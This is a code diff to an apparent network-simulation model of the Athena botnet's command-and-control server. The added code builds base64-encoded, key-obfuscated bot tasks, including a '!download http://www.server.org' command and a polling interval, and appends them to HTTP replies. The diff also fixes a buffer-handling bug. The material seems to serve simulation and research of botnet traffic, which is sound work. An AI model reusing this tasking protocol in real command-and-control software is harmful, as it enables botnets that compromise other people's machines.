@@ -304,7 +304,7 @@ httptools::HttpReplyMessage *AthenaCC::handlePostRequest(httptools::HttpRequestM
         coded_keys[i] = contents[0][i];
         coded_keys[i+1] = '\0';
     }
-    size_t result = base64_decode(coded_keys, decoded_keys, keys_size+1);
+    base64_decode(coded_keys, decoded_keys, keys_size+1);
     tokenizer = cStringTokenizer(decoded_keys, ":");
     std::vector<std::string> keys = tokenizer.asVector();
 
@@ -320,10 +320,32 @@ httptools::HttpReplyMessage *AthenaCC::handlePostRequest(httptools::HttpRequestM
     strtr(coded_data, keys[1].c_str(), keys[0].c_str());
 
     EV_INFO << "Key A: " << keys[0] << endl << "Key B: " << keys[1] << endl;
-    result = base64_decode(coded_data, decoded_data, n+1);
+    base64_decode(coded_data, decoded_data, n+1);
     EV_INFO << "Data:" << endl << decoded_data << endl;
     processData(decoded_data);
     replymsg = generateReply(request, contents[2]);
+    // interval
+    char interval[] = "|interval=60|";
+    char download[] = "|taskid=1|command=!download http://www.server.org 1|\n";
+    char interval_64[2000];
+    char download_64[2000];
+    memset(interval_64, 0, sizeof(interval_64));
+    memset(download_64, 0, sizeof(download_64));
+    base64_encode((unsigned char *)interval, strlen(interval), interval_64, sizeof(interval_64));
+    base64_encode((unsigned char *)download, strlen(download), download_64, sizeof(download_64));
+    char tasks[5000];
+    memset(tasks, 0, sizeof(tasks));
+    std::ostringstream stream;
+    stream << interval_64 << "\n" << download_64 << "\n";
+    std::string pd = stream.str();
+    std::copy(pd.begin(), pd.end(), tasks);
+    char tasks_64[2000];
+    memset(tasks_64, 0, sizeof(tasks_64));
+    base64_encode((unsigned char *)tasks, strlen(tasks), tasks_64, sizeof(tasks_64));
+    strtr(tasks_64, keys[0].c_str(), keys[1].c_str());
+    stream.clear();
+    stream << replymsg->payload() << tasks_64;
+    replymsg->setPayload(stream.str().c_str());
 
     return replymsg;
 }
@@ -342,15 +364,14 @@ httptools::HttpReplyMessage *AthenaCC::generateReply(httptools::HttpRequestMessa
     replymsg->setContentType(1);    // Emulates the content-type header field
     replymsg->setKind(HTTPT_RESPONSE_MESSAGE);
     char outDataMarker_encoded[2000];
+    char outDataMarker_decoded[2000];
     memset(outDataMarker_encoded, 0, sizeof(outDataMarker_encoded));
-    char *outDataMarker_decoded = new char[outDataMarker.size() + 1];
-    std::copy(outDataMarker.begin(), outDataMarker.end(), outDataMarker_decoded);
-    outDataMarker_decoded[outDataMarker.size()+1] = '\0';
+    memset(outDataMarker_decoded, 0, sizeof(outDataMarker_decoded));
+    std::copy(outDataMarker.begin(), outDataMarker.end()-1, outDataMarker_decoded); // Doesn't include \n character
     base64_encode((unsigned char *) outDataMarker_decoded, strlen(outDataMarker_decoded), outDataMarker_encoded, sizeof(outDataMarker_encoded));
     replymsg->setPayload(outDataMarker_encoded);
     int size = strlen(outDataMarker_encoded);
     replymsg->setByteLength(size);
-    delete[] outDataMarker_decoded;
     return replymsg;
 }
 
